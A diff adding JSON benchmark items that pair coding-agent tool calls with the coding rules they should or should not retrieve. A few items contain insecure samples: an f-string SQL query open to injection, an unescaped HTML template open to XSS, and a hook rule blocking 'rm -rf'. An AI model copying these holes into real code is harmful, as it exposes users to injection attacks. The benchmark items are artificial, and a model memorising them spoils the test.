+        "query": "Edit: src/services/user_service.py -- old_string='class UserService:\n    def __init__(self):\n        self.db = sqlite3.connect(\"users.db\")\n        self.cache = {}\n    def get_user(self, user_id):\n        cursor = self.db.cursor()\n        cursor.execute(f\"SELECT * FROM users WHERE id = {user_id}\")' new_string='@dataclass(frozen=True)\nclass User:\n    id: int; name: str; email: str\nclass UserService:\n    async def get_user(self, user_id: int) -> User | None:\n        async with aiosqlite.connect(self._db_url) as db:\n            cursor = await db.execute(\"SELECT * FROM users WHERE id = ?\", (user_id,))'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use parameterized queries to prevent SQL injection",
+            "Use frozen dataclasses for immutable data",
+            "Use type hints on all function signatures",
+            "Always close file handles and database connections",
+            "Prefer immutable data structures over mutable ones",
+            "Use asyncio for I/O-bound operations, not threads",
+            "Use environment variables for configuration, not hardcoded values"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "large-edit-error-handling",
+        "query": "Edit: src/api/client.py -- old_string='def fetch_data(url):\n    try:\n        response = requests.get(url)\n        return response.json()\n    except:\n        pass' new_string='async def fetch_data(url: str) -> dict[str, Any]:\n    try:\n        async with aiohttp.ClientSession() as session:\n            async with session.get(url) as response:\n                response.raise_for_status()\n                return await response.json()\n    except aiohttp.ClientError as e:\n        logger.error(\"Failed: %s\", e)\n        raise'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always handle errors explicitly, never silently swallow exceptions",
+            "Use asyncio for I/O-bound operations, not threads",
+            "Use type hints on all function signatures",
+            "No console.log or print debug statements in production code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "large-write-fastapi-app",
+        "query": "Write: src/main.py -- content='from fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel, EmailStr\nimport os\napp = FastAPI()\nDB_URL = os.environ[\"DATABASE_URL\"]\nclass UserCreate(BaseModel):\n    name: str\n    email: EmailStr\n@app.post(\"/users\")\nasync def create_user(user: UserCreate):\n    async with get_db() as conn:\n        result = await conn.execute(\"INSERT INTO users (name, email) VALUES ($1, $2)\", user.name, user.email)\n        return {\"id\": result}'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always validate user input at system boundaries",
+            "Use environment variables for configuration, not hardcoded values",
+            "Use type hints on all function signatures",
+            "Use parameterized queries to prevent SQL injection",
+            "Always close file handles and database connections",
+            "Document all public API functions with docstrings"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "neg-read-changelog",
+        "query": "Read: CHANGELOG.md",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-read-license",
+        "query": "Read: LICENSE",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-wc",
+        "query": "Bash: wc -l src/**/*.py",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-git-log",
+        "query": "Bash: git log --oneline -10",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip",
+            "Never force-push to main or master branch"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-git-status",
+        "query": "Bash: git status",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-cat-readme",
+        "query": "Bash: cat README.md | head -20",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-ls-recursive",
+        "query": "Bash: ls -la src/",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-echo-hello",
+        "query": "Bash: echo 'Hello, World!'",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-python-calc",
+        "query": "Bash: python3 -c 'print(2**10)'",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-glob-markdown",
+        "query": "Glob: docs/**/*.md",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-grep-function-def",
+        "query": "Grep: def test_ in tests/",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-read-ci-config",
+        "query": "Read: .github/workflows/test.yml",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-git-branch-list",
+        "query": "Bash: git branch -a --sort=-committerdate",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-tree-directory",
+        "query": "Bash: tree -I node_modules -L 3",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-read-makefile",
+        "query": "Read: Makefile",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "neg-bash-jq-parse",
+        "query": "Bash: cat data.json | jq '.results[] | .name'",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "borderline-git-commit-no-tests",
+        "query": "Bash: git add src/new_feature.py && git commit -m 'add user profile endpoint'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Run quality checks before every commit",
+            "Use conventional commit format (feat:, fix:, refactor:, etc.)",
+            "100% test coverage on all new code",
+            "Write tests before implementation (TDD red-green-refactor)",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "borderline-write-config-with-defaults",
+        "query": "Write: src/settings.py -- content='from dataclasses import dataclass\n@dataclass\nclass Settings:\n    db_host: str = \"localhost\"\n    db_port: int = 5432\n    max_retries: int = 3\n    timeout: float = 30.0'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use frozen dataclasses for immutable data",
+            "Prefer immutable data structures over mutable ones",
+            "Extract magic numbers into named constants",
+            "Use environment variables for configuration, not hardcoded values"
+        ],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "borderline-edit-thread-pool",
+        "query": "Edit: src/scraper.py -- old_string='from concurrent.futures import ThreadPoolExecutor\ndef scrape_all(urls):\n    with ThreadPoolExecutor(max_workers=10) as pool:\n        results = list(pool.map(fetch, urls))' new_string='import asyncio, aiohttp\nasync def scrape_all(urls: list[str]) -> list[dict]:\n    async with aiohttp.ClientSession() as session:\n        return await asyncio.gather(*[fetch(session, url) for url in urls])'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use asyncio for I/O-bound operations, not threads",
+            "Use type hints on all function signatures",
+            "Always close file handles and database connections"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "borderline-edit-logging-secrets",
+        "query": "Edit: src/auth.py -- old_string='logger.info(f\"User {username} logged in with token {token}\")' new_string='logger.info(\"User %s authenticated successfully\", username)'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "No console.log or print debug statements in production code"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "borderline-subprocess-run",
+        "query": "Edit: src/deploy.py -- old_string='os.system(f\"deploy {app_name} --env={env}\")' new_string='subprocess.run([\"deploy\", app_name, f\"--env={env}\"], check=True, capture_output=True)'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never use eval() or exec() in production code",
+            "Always handle errors explicitly, never silently swallow exceptions"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "mined-fa2-python-c-benchmark",
+        "query": "Bash: /home/turiya/miniconda3/bin/python -c \"import time, numpy as np; from fa2util import *; print(time.time())\"",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "mined-fa2-write-ci-yaml",
+        "query": "Write: .github/workflows/ci.yml -- content='name: CI\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install -e .[dev]\n      - run: pytest tests/ -v'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use uv for all Python package operations, never pip",
+            "100% test coverage on all new code"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "mined-fa2-edit-gitignore",
+        "query": "Edit: .gitignore -- old_string='CLAUDE.md' new_string=''",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Add .gitignore entries for generated files and build artifacts"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "mined-whisper-edit-test",
+        "query": "Edit: tests/test_cli.py -- old_string='def test_transcribe_file(self, tmp_path):\n        import wave' new_string='def test_transcribe_file_not_found(self, tmp_path):\n        args = MagicMock'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Write tests before implementation (TDD red-green-refactor)",
+            "100% test coverage on all new code"
+        ],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "mined-whisper-write-websocket",
+        "query": "Write: src/whisper_dictation/engine/websocket.py -- content='\"\"\"WebSocket streaming engine.\"\"\"\nfrom __future__ import annotations\nimport asyncio, json, logging\nfrom dataclasses import dataclass, field\nlogger = logging.getLogger(__name__)'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Document all public API functions with docstrings",
+            "Use frozen dataclasses for immutable data",
+            "Use type hints on all function signatures"
+        ],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "mined-gravity-edit-test-ts",
+        "query": "Edit: tests/health/web-chat-command-logging.test.ts -- old_string='const mockChatLogEntries: Array<Record<string, unknown>> = [];' new_string='const { mockChatLog, mockChatLogEntries } = vi.hoisted(() => {'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code",
+            "Use type hints on all function signatures"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Run ruff and mypy before committing Python code"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "mined-gravity-glob-api-routes",
+        "query": "Glob: **/api/agents/chats/**/route.ts in mission-control/src",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "mined-gravity-grep-env-var",
+        "query": "Grep: GRAVITY_CLAW_URL in mission-control/src/**/*.ts",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use environment variables for configuration, not hardcoded values"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "mined-gravity-edit-readme",
+        "query": "Edit: mission-control/README.md -- old_string='| **Tiles** | Static JSON | /api/tiles' new_string='| **Tiles** | Static JSON (server-side) | loadTiles() in page.tsx'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Document all public API functions with docstrings"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "mined-delulu-tmux-long-task",
+        "query": "Bash: tmux send-keys -t cody 'Proceed NOW with full CDT rebuild + benchmark. Steps: 1. Build full Sonnet CDT.'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "mined-delulu-kill-process",
+        "query": "Bash: kill 1016705 1016735 2>/dev/null; sleep 2; ps aux | grep 'classify' | grep -v grep | wc -l",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "mined-delulu-uv-pytest-cov",
+        "query": "Bash: uv run pytest --cov=delulu --cov-report=term-missing --cov-fail-under=100 -q 2>&1 | tail -30",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "100% test coverage on all new code",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "mined-delulu-tmux-ralph-fix",
+        "query": "Bash: tmux send-keys -t ralph 'Fix the 4 mypy errors in cli.py: (1) Too many arguments for AgentAdapter'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Send Enter after every tmux send-keys command",
+            "Use type hints on all function signatures"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "mined-canopy-uv-ruff-multi",
+        "query": "Bash: uv run ruff check src/canopy/ tests/test_embeddings.py tests/test_core.py tests/test_builder.py 2>&1",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Run ruff and mypy before committing Python code",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "mined-canopy-sleep-monitor",
+        "query": "Bash: sleep 3600 && ps aux | grep 'codified_decision_tree' | grep -v grep | wc -l",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "mined-blog-git-add-commit-push",
+        "query": "Bash: git add -A && git commit -m 'feat: add arXiv MCP to README' && git push",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Run quality checks before every commit",
+            "Use conventional commit format (feat:, fix:, refactor:, etc.)",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "mined-blog-write-hookify",
+        "query": "Write: .claude/hookify.dangerous-rm.local.md -- content='name: dangerous-rm\nenabled: true\nevent: bash\npattern: rm -rf\naction: block'",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git",
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "mined-blog-find-tsx-files",
+        "query": "Bash: find /home/turiya/projects/bhargavchippada.github.io/src -name '*.tsx' -o -name '*.ts' | head -20",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "negative"
+    },
+    {
+        "id": "edge-git-commit-with-env-ref",
+        "query": "Bash: git add .env.example && git commit -m 'docs: add env example file'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Run quality checks before every commit",
+            "Use conventional commit format (feat:, fix:, refactor:, etc.)",
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "edge-pip-install-in-ci",
+        "query": "Bash: pip install -e '.[dev]' && pytest",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use uv for all Python package operations, never pip",
+            "100% test coverage on all new code"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "edge-sudo-pip",
+        "query": "Bash: sudo pip3 install numpy pandas",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "edge-python-open-no-with",
+        "query": "Edit: src/loader.py -- old_string='f = open(\"data.csv\")\ndata = f.read()' new_string='with open(\"data.csv\") as f:\n    data = f.read()'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always close file handles and database connections"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "edge-write-py-no-types",
+        "query": "Write: src/utils.py -- content='def calculate_total(items, tax_rate):\n    subtotal = sum(item[\"price\"] * item[\"qty\"] for item in items)\n    return subtotal * (1 + tax_rate)'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use type hints on all function signatures",
+            "Document all public API functions with docstrings"
+        ],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "edge-edit-catch-all-exception",
+        "query": "Edit: src/worker.py -- old_string='try:\n    process(item)\nexcept Exception:\n    pass' new_string='try:\n    process(item)\nexcept ProcessingError as e:\n    logger.error(\"Failed: %s\", e)\n    raise'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Always handle errors explicitly, never silently swallow exceptions"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "edge-write-dataclass-mutable",
+        "query": "Write: src/models.py -- content='from dataclasses import dataclass\n@dataclass\nclass Config:\n    host: str\n    port: int\n    debug: bool = False\n    retries: int = 3'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Use frozen dataclasses for immutable data",
+            "Prefer immutable data structures over mutable ones"
+        ],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "edge-edit-magic-number-sleep",
+        "query": "Edit: src/retry.py -- old_string='time.sleep(0.5)\nif retries > 3:' new_string='time.sleep(RETRY_DELAY_SECONDS)\nif retries > MAX_RETRIES:'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Extract magic numbers into named constants"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "easy"
+    },
+    {
+        "id": "edge-git-force-push-feature",
+        "query": "Bash: git push --force origin feature/my-branch",
+        "corpus": "rules_basic.txt",
+        "should_match": [],
+        "should_not_match": [
+            "Never force-push to main or master branch"
+        ],
+        "difficulty": "hard"
+    },
+    {
+        "id": "edge-git-push-force-lease-main",
+        "query": "Bash: git push --force-with-lease origin main",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Never force-push to main or master branch"
+        ],
+        "should_not_match": [
+            "Send Enter after every tmux send-keys command"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "edge-write-html-user-input",
+        "query": "Write: templates/profile.html -- content='<div class=\"bio\">{{ user.bio | safe }}</div><p>Welcome, {{ user.name }}</p>'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Sanitize all HTML output to prevent XSS"
+        ],
+        "should_not_match": [
+            "Use uv for all Python package operations, never pip"
+        ],
+        "difficulty": "medium"
+    },
+    {
+        "id": "edge-edit-500-line-file",
+        "query": "Edit: src/monolith.py (490 lines) -- old_string='# end of file' new_string='def new_handler():\n    pass\n# end of file'",
+        "corpus": "rules_basic.txt",
+        "should_match": [
+            "Keep functions under 50 lines, files under 400 lines"
+        ],
+        "should_not_match": [
+            "Never commit secrets (API keys, tokens, passwords) to git"
+        ],
+        "difficulty": "medium"
     }
 ]
